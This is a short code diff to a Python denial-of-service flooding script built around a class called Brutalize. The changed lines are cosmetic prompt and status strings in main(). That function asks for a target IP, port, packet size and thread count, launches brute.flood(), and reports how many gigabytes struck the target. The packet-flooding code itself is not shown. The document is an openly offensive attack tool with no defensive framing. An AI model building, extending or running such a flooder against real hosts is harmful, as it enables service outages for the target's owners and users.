@@ -74,10 +74,10 @@ class Brutalize:
 
 
 def main():
-    ip = input(f"{couleur.RED}\nIp -> {couleur.RESET}")
-    port = input(f"{couleur.RED}\nPort (enter default) -> {couleur.RESET}")
-    force = input(f"{couleur.RED}\nOctets Per Packet (enter default) -> {couleur.RESET}")
-    threads = input(f"{couleur.RED}\nThreads (enter default) -> {couleur.RESET}")
+    ip = input(f"{couleur.RED}\n[?] | Ip -> {couleur.RESET}")
+    port = input(f"{couleur.RED}\n[?] | Port (enter default) -> {couleur.RESET}")
+    force = input(f"{couleur.RED}\n[?] | Octets Per Packet (enter default) -> {couleur.RESET}")
+    threads = input(f"{couleur.RED}\n[?] | Threads (enter default) -> {couleur.RESET}")
 
     if force == '':
         force = 1250
@@ -95,13 +95,13 @@ def main():
         except ValueError:
             ErreurNombre()
 
-    print(f"\n{couleur.RED}Start Attack \"{couleur.CYAN}{ip}{couleur.RED}\".{couleur.RESET}")
+    print(f"\n{couleur.RED}[!] | Start Attack \"{couleur.CYAN}{ip}{couleur.RED}\".\n{couleur.RESET}")
     brute = Brutalize(ip, port, force, threads)
     try:
         brute.flood()
     except:
         brute.stop()
-        print(f"\n{couleur.RED}[ERREUR] | {couleur.LIGHTRED_EX}Attack Stop", couleur.RESET)
+        print(f"\n{couleur.RED}[*] | {couleur.LIGHTRED_EX}Attack Stop", couleur.RESET)
         Reset()
 
     try:
@@ -109,7 +109,7 @@ def main():
             sleep(1000000)
     except KeyboardInterrupt:
         brute.stop()
-        print(f"{couleur.RED}Attack Stop. \"{couleur.CYAN}{ip}{couleur.RED}\" a was struck by \"{round(brute.total, 1)}Go\".\n")
+        print(f"{couleur.RED}[!] | Attack Stop. \"{couleur.CYAN}{ip}{couleur.RED}\" a was struck by \"{round(brute.total, 1)}Go\".\n")
         Reset()
 
 if __name__ == '__main__':
